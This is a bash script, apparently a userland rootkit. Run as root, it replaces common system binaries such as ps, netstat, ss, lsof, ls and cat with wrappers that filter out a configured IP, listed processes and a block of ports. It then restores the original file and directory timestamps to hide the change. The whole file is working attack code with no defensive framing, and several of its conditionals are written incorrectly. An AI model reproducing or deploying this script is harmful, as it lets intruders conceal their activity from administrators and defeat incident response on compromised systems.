#!/bin/bash

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi

get_timestamp () {
	stat -L $1 | grep Modify | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
}

# *** Configurable variables ***
IP="10.10.2.4"
IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP for use with egrep
COMMANDS="ps top ss netstat lsof who w last cat ls grep egrep"
PROCESSES="egrep|sleep|run-parts|cron\.hourly|/usr/sbin/CROND -n|gnano|setsid|wget|flock"
PORTS="59000|59001|59002|59003|59004|59005|59006|59007|59008|59009|60000|60001|60002|60003|60004|60005|60006|60007|60008|60009"
HIDE_ME="$IP_ESCAPED|$PROCESSES|$PORTS"

# *** Main ***
bin_timestamp=$(get_timestamp /bin)
sbin_timestamp=$(get_timestamp /sbin)

for process in $COMMANDS; do
	if $(which $process); then
		process_path=$(which $process)

		if [ -f "/bin/bak${process}" ]; then
			echo "[-] Binary '$process' has already been hijacked, skipping"
		else
			process_timestamp=$(get_timestamp "$process_path")
			if [ ! cp "$process_path" "/bin/bak${process}" ]; then
				echo "[!] Could not copy '$process_path' to '/bin/bak${process}', aborting"
			else
				if [ ! echo "/bin/bak${process} \$@ | egrep -v \"$HIDE_ME\"" > "$process_path" ]; then
					echo "[!] Could not write to '$process_path', restoring original binary..."
					mv "/bin/bak${process}" "$process_path"
					touch -t $process_timestamp "$process_path"
				else
					chmod 755 "$process_path"
					touch -t $process_timestamp "$process_path"
					echo "[*] Hijacked binary '$process_path'"
				fi
			fi
		fi
	else
		echo "[-] Binary '$process' doesn't exist, skipping"
	fi
done

touch -t $bin_timestamp "/bin"
touch -t $sbin_timestamp "/sbin"

echo
echo "[+] Restored '/bin' and '/sbin' timestamps"

echo
echo "[+] Done!"
